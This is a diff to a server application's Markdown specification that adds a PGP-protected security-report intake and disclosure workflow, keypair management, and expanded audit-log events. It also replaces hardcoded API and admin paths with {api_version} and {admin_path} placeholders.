+3. **Encryption at rest:** the report body is encrypted with the project's PGP key if one exists; otherwise AES-256-GCM with `server.security.encryption_key` (the spec's canonical at-rest AES key — see PART 11 → "Cryptographic Keys"). Plaintext is NEVER persisted to disk.
+4. **Maintainer notification:** PGP-encrypted email to every Server Admin who has registered a personal pubkey (admin profile setting); falls back to AES-encrypted attachment + warning if no admin has a pubkey.
+5. **Researcher acknowledgment:** PGP-encrypted email to researcher's submitted email (using their submitted pubkey if any), containing the `tracking_id` and the URL `/server/security/report/{tracking_id}` (with a one-shot token only the researcher can use).
+6. **Response to the form POST:** canonical success body — `{"ok": true, "data": {"tracking_id": "sec_..."}}` — with a clear "we received your report; check your email for confirmation" message rendered server-side.
+7. **Logging:** one entry to `security.log` as `security.report_received` — `tracking_id`, severity, sanitized affected-component, NO researcher PII, NO vulnerability content. Maintainers see full content only via the encrypted email or the admin tracker (after auth).
+
+### Public Pages
+
+| Endpoint | Method | Auth | Purpose |
+|----------|--------|------|---------|
+| `/.well-known/security.txt` | GET | None | RFC 9116 file — see above |
+| `/.well-known/pgp-key.asc` | GET | None | Project's PGP public key (ASCII-armored). 404 if no keypair generated yet. |
+| `/server/security/policy` | GET | None | Disclosure policy page (HTML). Default content provided; editable from admin panel. Lists the coordinated-disclosure window, in-scope domains, out-of-scope behaviors, safe-harbor language. |
+| `/server/security/thanks` | GET | None | Acknowledgments page. Lists researchers who opted in (real name, handle, or anonymized "Anonymous Researcher #n") with the year and short credit. |
+| `/server/security/report/{tracking_id}` | GET | One-shot token in URL | Researcher status page — shows triage state (Received / Triaged / Confirmed / Patching / Disclosed / Won't Fix), maintainer comments visible to researcher, expected disclosure date. Token is single-use-per-day; expires after the report is closed for 30 days. |
+
+### Admin Panel — `/{admin_path}/server/security/`
+
+**Note on the two `security` admin namespaces:**
+
+| Path | Concern | Cross-link |
+|------|---------|------------|
+| `/{admin_path}/server/security/{reports,policy,thanks,keypair}` | **Disclosure feature** — managing the coordinated-disclosure pipeline (reports, policy page, hall of fame, GPG keypair). | This section. |
+| `/{admin_path}/server/security/{blocked-ips,allowlist,locked-accounts}` | **Runtime defense** — IP blocks, allow-lists, account lockouts. | PART 11 → "IP Block Management" (already documented). |
+| `/{admin_path}/server/web/security` | **`security.txt` content** — the file's `Expires`, languages, keyservers list. Recipient email is in `server.contact.security` (PART 12). | Existing — PART 11 → "security.txt". |
+
+All three coexist under the admin tree. The admin-panel UI groups them under a single "Security" sidebar entry with sub-tabs so operators see them in one place even though the route paths are slightly different.
+
+| Page | Purpose |
+|------|---------|
+| `/{admin_path}/server/security/reports` | List of all security reports with `tracking_id`, summary, severity, state. Sortable/filterable. Click → full report (decrypted on the server, viewed in-browser via authenticated session — never sent to log files). |
+| `/{admin_path}/server/security/reports/{tracking_id}` | Full report view: vulnerability details, researcher info, attached PGP-encrypted artifacts, triage notes, state machine controls, "send researcher update" composer (encrypts to researcher pubkey). |
+| `/{admin_path}/server/security/policy` | Edit `/server/security/policy` content (Markdown). Default safe-harbor text provided. |
+| `/{admin_path}/server/security/thanks` | Manage acknowledgment listings (toggle visibility per researcher, edit handle, sort order). Adding/removing entries follows researcher's stored credit preference. |
+| `/{admin_path}/server/security/keypair` | GPG keypair management — see "GPG Keypair Management" below. |
+
+### GPG Keypair Management (Admin Panel)
+
+**One project-level GPG keypair. Used to encrypt incoming security reports at rest, sign outbound notifications, and seed the `Encryption:` line in security.txt.**
+
+| Action | Behavior |
+|--------|----------|
+| **Generate** | Generates an Ed25519 (signing) + Curve25519 (encryption) keypair. Identity is `{app_name} Security <{security_contact}>`. Expires 2 years from generation. Private key is encrypted with a key derived from `installation_secret` and stored in `{config_dir}/security/pgp.priv.asc.enc`. Public key stored at `{config_dir}/security/pgp.pub.asc` (also served at `/.well-known/pgp-key.asc`). |
+| **Rotate** | Generates a new keypair, signs the new pubkey with the old key, publishes the rotation to configured keyservers. Old key stays valid for 30 days for in-flight reports. |
+| **Publish to keyservers** | POST the public key to each entry in `web.security.keyservers`. Uses the keyserver's HTTP submission endpoint (`https://keys.openpgp.org/vks/v1/upload` for keys.openpgp.org, similar for ubuntu). Triggered automatically on generate/rotate; manually via "Republish" button. Failures are logged + retried with exponential backoff. |
+| **Export public key** | Download `pgp.pub.asc` directly from the admin panel. Or use the public URL `/.well-known/pgp-key.asc`. |
+| **Export private key** | **Full export, ASCII-armored, decrypted with the operator's confirmation password.** Triggers a sensitive-operation flow (PART 5 → "Sensitive Operations"): re-prompt admin password, log to `audit.log` as `security.private_key_exported`, return the file as a single download. **The download is rate-limited to 1 per hour per admin and the audit entry includes admin username, IP, and reason text the admin must type.** |
+| **Import private key** | Upload an existing `pgp.priv.asc` (e.g., restoring from backup, migrating from another instance). Same sensitive-operation gate. Validates the key's identity matches the project's expected identity (warns on mismatch — admin can override). |
+| **Delete** | Sensitive-operation flow. Deletes both keys, sets `web.security.publish_pgp_key: false`, removes `Encryption:` line from security.txt. In-flight encrypted reports become un-decryptable — admin warned and must type confirmation. |
+
+**Keypair properties stored in DB (NOT the keys themselves — those are on disk):**
+
+| Field | Description |
+|-------|-------------|
+| `fingerprint` | Full SHA-256 fingerprint, displayed on admin page and in security.txt comments |
+| `created_at` | When the keypair was generated |
+| `expires_at` | Key expiry (2 years default) |
+| `last_rotated_at` | When most recently rotated (NULL if never) |
+| `keyservers_published` | List of keyservers the pubkey has been pushed to (with timestamps) |
+| `revoked` | Boolean — set if `Delete` was used (the key file may be gone but the fingerprint stays in audit history) |
+
+### Backup Integration (PART 22)
+
+**The PGP private key is part of the backup set — losing it means losing the ability to decrypt in-flight security reports. PART 22 → "Backup Contents" includes:**
+
+| Path | Included | Notes |
+|------|----------|-------|
+| `{config_dir}/security/pgp.pub.asc` | Always | Public key (also published, but back up anyway for completeness) |
+| `{config_dir}/security/pgp.priv.asc.enc` | Always | Encrypted private key. The decryption KDF input is `installation_secret`, which is also part of the backup — so a backup is sufficient to restore. |
+| Security reports DB rows | Always | Tracking metadata. The encrypted report bodies are restored too (encrypted at rest with the same PGP key). |
+| `{config_dir}/security/keyservers.state` | Always | Per-keyserver publish state, so a restore doesn't double-submit. |
+
+**Restore behavior:** restoring a backup re-installs the keypair AND re-publishes the public key to the configured keyservers (idempotent — keyservers de-duplicate by fingerprint). The `installation_secret` is restored from the same backup, so the encrypted private key decrypts correctly.
+
+**Operator UX:** running `weather backup create` and `weather backup restore` covers the security keypair without any extra steps. Admin panel "Test Backup" runs a dry-run restore of the keypair specifically and reports whether the encrypted private key decrypts successfully.
+
+### Admin Panel (/{admin_path}/web)
 
 **robots.txt Settings:**
 
@@ -14257,9 +15341,9 @@ web:
 **Access Log Formats:**
 | Format | Description | Example |
 |--------|-------------|---------|
-| `apache` | Apache Combined Log Format (default) | `127.0.0.1 - - [10/Oct/2024:13:55:36 -0700] "GET /api/v1/healthz HTTP/1.1" 200 2326 "-" "curl/7.64.1"` |
-| `nginx` | Nginx Common Log Format | `127.0.0.1 - - [10/Oct/2024:13:55:36 -0700] "GET /api/v1/healthz HTTP/1.1" 200 2326` |
-| `json` | Structured JSON | `{"ip":"127.0.0.1","time":"2024-10-10T13:55:36Z","method":"GET","path":"/api/v1/healthz","status":200,"size":2326,"ua":"curl/7.64.1"}` |
+| `apache` | Apache Combined Log Format (default) | `127.0.0.1 - - [10/Oct/2024:13:55:36 -0700] "GET /api/{api_version}/healthz HTTP/1.1" 200 2326 "-" "curl/7.64.1"` |
+| `nginx` | Nginx Common Log Format | `127.0.0.1 - - [10/Oct/2024:13:55:36 -0700] "GET /api/{api_version}/healthz HTTP/1.1" 200 2326` |
+| `json` | Structured JSON | `{"ip":"127.0.0.1","time":"2024-10-10T13:55:36Z","method":"GET","path":"/api/{api_version}/healthz","status":200,"size":2326,"ua":"curl/7.64.1"}` |
 
 **Security Log Formats:**
 | Format | Description | Use Case |
@@ -14272,15 +15356,19 @@ web:
 
 **Text Log Format:**
 ```
-2024-10-10 13:55:36 [INFO] Server started on :8080
+2024-10-10 13:55:36 [INFO] bind: 0.0.0.0:64580 ok
+2024-10-10 13:55:36 [INFO] externally accessible at: https://mydomain.org
 2024-10-10 13:55:40 [ERROR] Database connection failed: timeout
 ```
 
 **JSON Log Format:**
 ```json
-{"time":"2024-10-10T13:55:36Z","level":"INFO","msg":"Server started on :8080"}
+{"time":"2024-10-10T13:55:36Z","level":"INFO","msg":"bind ok","bind_addr":"0.0.0.0:64580"}
+{"time":"2024-10-10T13:55:36Z","level":"INFO","msg":"external URL","url":"https://mydomain.org"}
 {"time":"2024-10-10T13:55:40Z","level":"ERROR","msg":"Database connection failed","error":"timeout"}
 ```
+
+**Note:** the bind line is the only place the internal address appears alone. As soon as a reverse-proxy header / DOMAIN env / observation is available, the "external URL" line is logged. Until then, the external URL falls back to `{proto}://{fqdn}:{port}` derived from the static resolution chain (host name, public IP, etc.) — never just `:port`.
 
 **Fail2ban Format:**
 ```
@@ -14296,7 +15384,7 @@ When using `format: custom`, these variables are available:
 |----------|-------------|
 | `{time}` | Time only |
 | `{date}` | Date only |
-| `{datetime}` | Date and time |
+| `{date_time}` | Date and time |
 | `{remote_ip}` | Client IP address |
 | `{method}` | HTTP method |
 | `{path}` | Request path |
@@ -14308,7 +15396,7 @@ When using `format: custom`, these variables are available:
 | `{user_agent}` | User agent string |
 | `{referer}` | Referer header |
 | `{request_id}` | Request ID |
-| `wthr.top` | Request host |
+| `{fqdn}` | Request host |
 | `{protocol}` | HTTP protocol version |
 | `{tls_version}` | TLS version (if HTTPS) |
 | `{country}` | GeoIP country code |
@@ -14557,11 +15645,11 @@ server:
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/orgs/{slug}/security/audit` | GET | List audit events (paginated) |
-| `/api/v1/orgs/{slug}/security/audit/export` | POST | Request audit export |
-| `/api/v1/orgs/{slug}/security/audit/export/{id}` | GET | Download audit export |
-| `/api/v1/orgs/{slug}/security/audit/retention` | GET | Get retention settings |
-| `/api/v1/orgs/{slug}/security/audit/retention` | PATCH | Update retention (org owner only) |
+| `/api/{api_version}/orgs/{slug}/security/audit` | GET | List audit events (paginated) |
+| `/api/{api_version}/orgs/{slug}/security/audit/export` | POST | Request audit export |
+| `/api/{api_version}/orgs/{slug}/security/audit/export/{id}` | GET | Download audit export |
+| `/api/{api_version}/orgs/{slug}/security/audit/retention` | GET | Get retention settings |
+| `/api/{api_version}/orgs/{slug}/security/audit/retention` | PATCH | Update retention (org owner only) |
 
 ### OIDC/LDAP Events
 
@@ -14586,6 +15674,30 @@ server:
 | `config.ssl_updated` | SSL certificate changed | Subject, expiry, changed by |
 | `config.ssl_expired` | SSL certificate expired | Domain |
 | `config.tor_address_regenerated` | Onion address regenerated | Changed by |
+| `config.contact_migrated` | Legacy contact key auto-migrated to `server.contact.*` (PART 12) | Source key, destination key |
+| `notify.webhook_sent` | Outbound webhook delivered successfully | Role (admin/security/general), transport, event |
+| `notify.webhook_failed` | Outbound webhook delivery failed (after retries) | Role, transport, event, status code (no body) |
+| `agent.registered` | New agent registered | agent_id, scope (admin/user/org), hostname, IP |
+| `agent.heartbeat` | Agent heartbeat received (high volume — sample 1/100) | agent_id |
+| `agent.token_expiring_soon` | Agent token will expire in <30d | agent_id, days_remaining |
+| `agent.token_rotated` | Agent rotated its own token | agent_id, old token id (truncated), new token id (truncated) |
+| `agent.token_force_rotated` | Server forced agent token rotation | agent_id, by (admin username) |
+| `agent.revoked` | Agent token revoked | agent_id, by, reason |
+| `agent.revoke_pushed` | Revocation control message delivered to agent | agent_id |
+| `agent.shutdown_revoked` | Agent shut down after receiving revocation (logged at server when agent confirms) | agent_id, ack_delay_seconds |
+| `agent.recovered` | Agent recovered via install_token after token expiry | agent_id |
+| `agent.update_started` | Agent began an auto-update download | agent_id, from_version, to_version, channel |
+| `agent.update_completed` | Agent running new version, first heartbeat from new binary received | agent_id, version |
+| `agent.update_rolled_back` | Watchdog reverted to previous binary after failed heartbeat | agent_id, attempted_version, reason |
+| `agent.update_checksum_invalid` | Downloaded binary SHA-256 did NOT match published checksum | agent_id, attempted_version, expected_sha256 |
+| `agent.update_forced` | Agent below `agent_min_version`; entered forced-update mode (refuses other work) | agent_id, current_version, min_version |
+| `cluster.node_joined` | New cluster node finished bootstrap | node_id, app_secrets versions delivered |
+| `cluster.node_removed` | Cluster node removed by admin | node_id, by, host_was_compromised (bool) |
+| `cluster.removed_self_cleanup` | Removed node wiped its local secrets (logged on the removed node) | node_id |
+| `cluster.secret_version_drift` | Heartbeat reported a stale secret version | node_id, secret name, lag |
+| `cluster.rotation_aborted_no_quorum` | Secret rotation aborted because <majority healthy nodes | secret name, attempted by |
+| `cluster.learned_hosts_reloaded` | Node refreshed its in-memory learned-origins from DB | node_id, count |
+| `security.agent_host_compromised` | Owner marked an agent host compromised on revoke | agent_id, by |
 | `config.branding_updated` | Branding settings changed | Changed by |
 | `config.oidc_provider_added` | OIDC provider configured | Provider name, added by |
 | `config.oidc_provider_removed` | OIDC provider removed | Provider name, removed by |
@@ -14600,10 +15712,24 @@ server:
 | `security.ip_blocked` | IP address blocked | IP, reason, duration, auto/manual |
 | `security.ip_unblocked` | IP address unblocked | IP, unblocked_by (system/admin), reason |
 | `security.country_blocked` | Request blocked by GeoIP | IP, country code |
-| `security.csrf_failure` | CSRF token validation failed | IP, endpoint |
+| `security.csrf_failure` | CSRF token validation failed | IP, endpoint, which check tripped (origin / token / SameSite) |
 | `security.invalid_token` | Invalid API token used | Token type, IP |
 | `security.brute_force_detected` | Brute force attempt detected | IP, target (masked), attempt count |
 | `security.suspicious_activity` | Unusual activity detected | IP, activity type, details |
+| `security.csp_violation` | CSP report received from a browser | Sanitized blocked-uri, directive, sample (PART 14 → "Public Reports Scope") |
+| `security.security_id_invalid` | `{security_id}` URL param failed validation on `/server/contact` | IP, user-agent, supplied id (truncated) |
+| `security.report_received` | Incoming security report submitted | tracking_id, severity (no researcher PII, no body) |
+| `security.report_state_changed` | Admin updated a report's state | tracking_id, old state, new state, admin username |
+| `security.private_key_exported` | Admin exported PGP private key (sensitive op) | Admin username, IP, reason text the admin typed |
+| `security.installation_secret_rotated` | `installation_secret` rotated | Admin username, IP |
+| `security.server_encryption_key_rotated` | `server.security.encryption_key` rotated | Admin username, IP |
+| `security.cookie_signing_key_rotated` | `cookie_signing_key` rotated (auto or manual) | trigger (`auto-90d` / `manual` / `password-change`) |
+| `security.csrf_token_secret_rotated` | `csrf_token_secret` rotated (auto or manual) | trigger |
+| `security.pgp_keypair_generated` | Project PGP keypair generated | Fingerprint, expiry |
+| `security.pgp_keypair_rotated` | Project PGP keypair rotated | Old fingerprint, new fingerprint, admin |
+| `security.pgp_keypair_deleted` | Project PGP keypair deleted | Old fingerprint, admin, IP |
+| `security.pgp_keyserver_publish_ok` | Pubkey successfully published | Keyserver host, fingerprint |
+| `security.pgp_keyserver_publish_failed` | Pubkey publish failed | Keyserver host, error category (no body) |
 
 ### Token Events
 
@@ -14618,10 +15744,15 @@ server:
 
 | Event | Description | Logged Data |
 |-------|-------------|-------------|
-| `backup.created` | Backup created | Filename, size, created by |
+| `backup.created` | Backup created and verified | Filename, size, encrypted, verification status, created by |
 | `backup.restored` | Backup restored | Filename, restored by |
 | `backup.deleted` | Backup deleted | Filename, deleted by |
 | `backup.failed` | Backup failed | Error message |
+| `backup.retention_cleanup` | Old backups deleted by count-based retention | Deleted files, reason, remaining count |
+| `backup.retention_pruned_disk` | Additional backups pruned because disk usage exceeded `max_disk_usage_percent` | Pre-prune %, post-prune %, files deleted, bytes freed |
+| `backup.disk_cap_overrun` | One backup file alone exceeds the disk cap; kept under hard-floor rule | Filename, file size, cap %, disk total |
+| `backup.verification_failed` | Backup verification failed | Filename, check that failed |
+| `backup.daily_updated` | Daily incremental updated | Filename, changes since last |
 | `server.started` | Application started | Version, mode, node ID |
 | `server.stopped` | Application stopped | Reason, uptime |
 | `server.maintenance_entered` | Maintenance mode enabled | Reason, enabled by |
@@ -14634,11 +15765,11 @@ server:
 
 | Event | Description | Logged Data |
 |-------|-------------|-------------|
-| `cluster.node_joined` | Node joined cluster | Node ID, IP |
-| `cluster.node_removed` | Node removed from cluster | Node ID, removed by |
 | `cluster.node_failed` | Node became unreachable | Node ID, last seen |
 | `cluster.token_generated` | Join token generated | Token ID (partial), generated by |
 | `cluster.mode_changed` | Cluster mode changed | Old mode, new mode, changed by |
+
+(`cluster.node_joined`, `cluster.node_removed`, `cluster.removed_self_cleanup`, `cluster.secret_version_drift`, `cluster.rotation_aborted_no_quorum`, `cluster.learned_hosts_reloaded` are defined in the canonical agent/cluster events table earlier in this PART.)
 
 ## Audit Log Format
 
@@ -14776,7 +15907,7 @@ server:
 - Show only first 8 characters: `token_abc12345...`
 - Or use separate ID field that doesn't expose token value
 
-## Admin Panel (`/admin/server/logs/audit`)
+## Admin Panel (`/{admin_path}/server/logs/audit`)
 
 | Element | Type | Description |
 |---------|------|-------------|
@@ -15089,28 +16220,28 @@ When GDPR/CCPA (right to erasure) conflicts with HIPAA/SOC2 (retention requireme
 | `/users/consents` | PATCH | Update consent preferences |
 | `/server/privacy` | GET | Privacy policy |
 | `/server/dpo` | GET | Data Protection Officer contact (GDPR) |
-| `/admin/server/compliance` | GET | Compliance dashboard |
-| `/admin/server/compliance/report` | POST | Generate compliance report |
-| `/admin/server/compliance/breach` | POST | Report data breach |
+| `/{admin_path}/server/compliance` | GET | Compliance dashboard |
+| `/{admin_path}/server/compliance/report` | POST | Generate compliance report |
+| `/{admin_path}/server/compliance/breach` | POST | Report data breach |
 
 ### Compliance API Endpoints
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/users/data/export` | POST | Request data export |
-| `/api/v1/users/data/export/{export_id}` | GET | Download export |
-| `/api/v1/users/data/delete` | POST | Request deletion |
-| `/api/v1/users/consents` | GET | Get consents |
-| `/api/v1/users/consents` | PATCH | Update consents |
-| `/api/v1/admin/server/compliance` | GET | Compliance status |
-| `/api/v1/admin/server/compliance/standards` | GET | Enabled standards |
-| `/api/v1/admin/server/compliance/report` | POST | Generate report |
-| `/api/v1/admin/server/compliance/breach` | POST | Report breach |
-| `/api/v1/admin/server/compliance/audit` | GET | Compliance audit log |
+| `/api/{api_version}/users/data/export` | POST | Request data export |
+| `/api/{api_version}/users/data/export/{export_id}` | GET | Download export |
+| `/api/{api_version}/users/data/delete` | POST | Request deletion |
+| `/api/{api_version}/users/consents` | GET | Get consents |
+| `/api/{api_version}/users/consents` | PATCH | Update consents |
+| `/api/{api_version}/{admin_path}/server/compliance` | GET | Compliance status |
+| `/api/{api_version}/{admin_path}/server/compliance/standards` | GET | Enabled standards |
+| `/api/{api_version}/{admin_path}/server/compliance/report` | POST | Generate report |
+| `/api/{api_version}/{admin_path}/server/compliance/breach` | POST | Report breach |
+| `/api/{api_version}/{admin_path}/server/compliance/audit` | GET | Compliance audit log |
 
 ### Admin UI: Compliance Dashboard
 
-**Location:** `/admin/server/compliance`
+**Location:** `/{admin_path}/server/compliance`
 
 | Section | Description |
 |---------|-------------|
@@ -15177,7 +16308,7 @@ The application does **not** implement database-level encryption. This is intent
 | Backup files | AES-256-GCM encrypted with admin password (if configured) |
 | Session tokens | Cryptographically random, short-lived |
 
-**Server Encryption Key:**
+### Server Encryption Key
 
 For 2FA secrets and other server-encrypted data:
 
@@ -15380,33 +16511,33 @@ type IPBlock struct {
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/security/blocked-ips` | GET | List blocked IPs |
-| `/api/v1/admin/server/security/blocked-ips` | POST | Manually block IP/CIDR |
-| `/api/v1/admin/server/security/blocked-ips/{ip}` | GET | Get block details |
-| `/api/v1/admin/server/security/blocked-ips/{ip}` | DELETE | Unblock IP |
-| `/api/v1/admin/server/security/blocked-ips/expired` | DELETE | Purge expired blocks from log |
-| `/api/v1/admin/server/security/allowlist` | GET | List allowlisted IPs/CIDRs (see Allowlist section) |
-| `/api/v1/admin/server/security/allowlist` | POST | Add IP/CIDR to allowlist |
-| `/api/v1/admin/server/security/allowlist/{id}` | DELETE | Remove from allowlist |
-| `/api/v1/admin/server/security/allowlist/check/{ip}` | GET | Check if IP is allowlisted |
+| `/api/{api_version}/{admin_path}/server/security/blocked-ips` | GET | List blocked IPs |
+| `/api/{api_version}/{admin_path}/server/security/blocked-ips` | POST | Manually block IP/CIDR |
+| `/api/{api_version}/{admin_path}/server/security/blocked-ips/{ip}` | GET | Get block details |
+| `/api/{api_version}/{admin_path}/server/security/blocked-ips/{ip}` | DELETE | Unblock IP |
+| `/api/{api_version}/{admin_path}/server/security/blocked-ips/expired` | DELETE | Purge expired blocks from log |
+| `/api/{api_version}/{admin_path}/server/security/allowlist` | GET | List allowlisted IPs/CIDRs (see Allowlist section) |
+| `/api/{api_version}/{admin_path}/server/security/allowlist` | POST | Add IP/CIDR to allowlist |
+| `/api/{api_version}/{admin_path}/server/security/allowlist/{id}` | DELETE | Remove from allowlist |
+| `/api/{api_version}/{admin_path}/server/security/allowlist/check/{ip}` | GET | Check if IP is allowlisted |
 
 **Account Lockout API:**
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/security/locked-accounts` | GET | List locked accounts |
-| `/api/v1/admin/server/security/locked-accounts/{id}` | DELETE | Unlock account |
+| `/api/{api_version}/{admin_path}/server/security/locked-accounts` | GET | List locked accounts |
+| `/api/{api_version}/{admin_path}/server/security/locked-accounts/{id}` | DELETE | Unlock account |
 
 **Security Settings API:**
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/security/settings` | GET | Get all security settings |
-| `/api/v1/admin/server/security/settings` | PATCH | Update security settings |
-| `/api/v1/admin/server/security/auth` | GET | Get auth settings (password policy, etc.) |
-| `/api/v1/admin/server/security/auth` | PATCH | Update auth settings |
-| `/api/v1/admin/server/security/ratelimit` | GET | Get rate limit settings |
-| `/api/v1/admin/server/security/ratelimit` | PATCH | Update rate limit settings |
+| `/api/{api_version}/{admin_path}/server/security/settings` | GET | Get all security settings |
+| `/api/{api_version}/{admin_path}/server/security/settings` | PATCH | Update security settings |
+| `/api/{api_version}/{admin_path}/server/security/auth` | GET | Get auth settings (password policy, etc.) |
+| `/api/{api_version}/{admin_path}/server/security/auth` | PATCH | Update auth settings |
+| `/api/{api_version}/{admin_path}/server/security/ratelimit` | GET | Get rate limit settings |
+| `/api/{api_version}/{admin_path}/server/security/ratelimit` | PATCH | Update rate limit settings |
 
 **Password Policy (Sane Defaults):**
 
@@ -15446,9 +16577,9 @@ When compliance standards are enabled, password policy automatically upgrades:
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/security/tokens` | GET | List all API tokens (admin view) |
-| `/api/v1/admin/server/security/tokens/{id}` | DELETE | Revoke token |
-| `/api/v1/admin/server/security/tokens/{id}/rotate` | POST | Force token rotation |
+| `/api/{api_version}/{admin_path}/server/security/tokens` | GET | List all API tokens (admin view) |
+| `/api/{api_version}/{admin_path}/server/security/tokens/{id}` | DELETE | Revoke token |
+| `/api/{api_version}/{admin_path}/server/security/tokens/{id}/rotate` | POST | Force token rotation |
 
 **Token Expiry (Sane Defaults):**
 
@@ -15535,10 +16666,10 @@ type AllowlistEntry struct {
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/security/allowlist` | GET | List all allowlisted IPs/CIDRs |
-| `/api/v1/admin/server/security/allowlist` | POST | Add IP/CIDR with optional description |
-| `/api/v1/admin/server/security/allowlist/{id}` | DELETE | Remove from allowlist |
-| `/api/v1/admin/server/security/allowlist/check/{ip}` | GET | Check if IP is allowlisted |
+| `/api/{api_version}/{admin_path}/server/security/allowlist` | GET | List all allowlisted IPs/CIDRs |
+| `/api/{api_version}/{admin_path}/server/security/allowlist` | POST | Add IP/CIDR with optional description |
+| `/api/{api_version}/{admin_path}/server/security/allowlist/{id}` | DELETE | Remove from allowlist |
+| `/api/{api_version}/{admin_path}/server/security/allowlist/check/{ip}` | GET | Check if IP is allowlisted |
 
 **Middleware:**
 
@@ -15566,7 +16697,7 @@ func IsAllowlisted(ctx context.Context) bool {
 }
 ```
 
-**Admin UI (`/admin/server/security/allowlist`):**
+**Admin UI (`/{admin_path}/server/security/allowlist`):**
 
 **Note:** Wireframe shows English for documentation. Actual UI renders ALL text via `t()` translation keys (see `admin.allowlist.*` in translation files). User sees their selected language.
 
@@ -15602,12 +16733,7 @@ func IsAllowlisted(ctx context.Context) bool {
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
-**Audit Events:**
-
-| Event | Description | Logged Data |
-|-------|-------------|-------------|
-| `security.ip_allowlisted` | IP/CIDR added to allowlist | CIDR, description, added_by |
-| `security.ip_allowlist_removed` | IP/CIDR removed from allowlist | CIDR, removed_by |
+**Audit Events:** `security.ip_allowlisted`, `security.ip_allowlist_removed`. See PART 11 → "Audit Log Events" for canonical definitions and logged-data fields.
 
 **Validation:**
 - Must be valid IPv4, IPv6, or CIDR notation
@@ -15618,7 +16744,7 @@ func IsAllowlisted(ctx context.Context) bool {
 
 **Admin UI: IP Blocks**
 
-**Location:** `/admin/server/security/blocked-ips`
+**Location:** `/{admin_path}/server/security/blocked-ips`
 
 | Section | Description |
 |---------|-------------|
@@ -15641,15 +16767,10 @@ func IsAllowlisted(ctx context.Context) bool {
 | Related Events | Link to audit log entries |
 | Actions | Unblock, Extend, Make Permanent |
 
-**Audit Events:**
+**Audit Events** (IP-related events `security.ip_blocked`, `security.ip_unblocked`, `security.ip_block_extended`, `security.ip_allowlisted`, `security.ip_allowlist_removed` are defined in PART 11 → "Audit Log Events"; the events below are unique to account / token / policy management):
 
 | Event | Description | Logged Data |
 |-------|-------------|-------------|
-| `security.ip_blocked` | IP was blocked | IP, reason, duration, auto/manual |
-| `security.ip_unblocked` | IP was unblocked | IP, unblocked_by (system/admin), reason |
-| `security.ip_block_extended` | Block duration extended | IP, new_expiry, reason |
-| `security.ip_allowlisted` | IP/CIDR added to allowlist | CIDR, description, added_by |
-| `security.ip_allowlist_removed` | IP/CIDR removed from allowlist | CIDR, removed_by |
 | `security.account_soft_locked` | Account soft locked | User ID (masked), attempts, duration |
 | `security.account_hard_locked` | Account hard locked | User ID (masked), attempts, duration |
 | `security.account_locked` | Account permanently locked | User ID (masked), attempts |
@@ -15685,17 +16806,17 @@ func IsAllowlisted(ctx context.Context) bool {
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/api/v1/admin/server/breaches` | GET | List all breaches |
-| `/api/v1/admin/server/breaches` | POST | Report new breach |
-| `/api/v1/admin/server/breaches/{id}` | GET | Get breach details |
-| `/api/v1/admin/server/breaches/{id}` | PATCH | Update breach status |
-| `/api/v1/admin/server/breaches/{id}/investigate` | POST | Start investigation |
-| `/api/v1/admin/server/breaches/{id}/contain` | POST | Mark as contained |
-| `/api/v1/admin/server/breaches/{id}/notify` | POST | Send notifications |
-| `/api/v1/admin/server/breaches/{id}/resolve` | POST | Mark as resolved |
-| `/api/v1/admin/server/breaches/{id}/affected` | GET | List affected users |
-| `/api/v1/admin/server/breaches/{id}/timeline` | GET | Breach timeline/events |
-| `/api/v1/admin/server/breaches/{id}/report` | GET | Generate breach report |
+| `/api/{api_version}/{admin_path}/server/breaches` | GET | List all breaches |
+| `/api/{api_version}/{admin_path}/server/breaches` | POST | Report new breach |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}` | GET | Get breach details |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}` | PATCH | Update breach status |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}/investigate` | POST | Start investigation |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}/contain` | POST | Mark as contained |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}/notify` | POST | Send notifications |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}/resolve` | POST | Mark as resolved |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}/affected` | GET | List affected users |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}/timeline` | GET | Breach timeline/events |
+| `/api/{api_version}/{admin_path}/server/breaches/{id}/report` | GET | Generate breach report |
 
 **Breach Data Model:**
 
@@ -15740,7 +16861,7 @@ const (
 
 **Admin UI: Breach Management**
 
-**Location:** `/admin/server/compliance/breaches`
+**Location:** `/{admin_path}/server/compliance/breaches`
 
 | Section | Description |
 |---------|-------------|
@@ -15854,8 +16975,8 @@ labels:
 
 **Behavior:**
 - All routes prefixed with baseurl (e.g., `/myproject/healthz`, `/myproject/api/v1/...`)
-- Static assets served from `//static/`
-- Admin panel at `//admin/`
+- Static assets served from `{base_url}/static/`
+- Admin panel at `{base_url}/{admin_path}/`
 - Generated URLs (redirects, links) use detected baseurl
 - Trailing slash normalized (both `/myproject` and `/myproject/` work)
 - Empty string treated as `/`
@@ -15905,6 +17026,29 @@ server:
     # Additional IPs/CIDRs to trust (private ranges always trusted)
     additional: []
 ```
+
+**Used by `X-Forwarded-*` trust gate.** Every header-based detection chain in the spec — `BuildURL(r, ...)` (PART 12 → "Resolution Order"), CORS allow-list resolution (PART 16), CSP `connect-src` learning, domain-learning algorithm — only honors `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Port`, `X-Real-IP`, `X-Original-Host` when the **immediate peer's IP** is in `trusted_proxies` (private ranges + the `additional` allow-list). Headers from non-trusted peers are dropped before resolution runs, so an attacker reaching the binary directly cannot inject a forged Host into the learned-origins list.
+
+| Always trusted (no config required) | Reason |
+|--------------------------------------|--------|
+| `127.0.0.0/8`, `::1` | Loopback |
+| `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` | RFC 1918 IPv4 private |
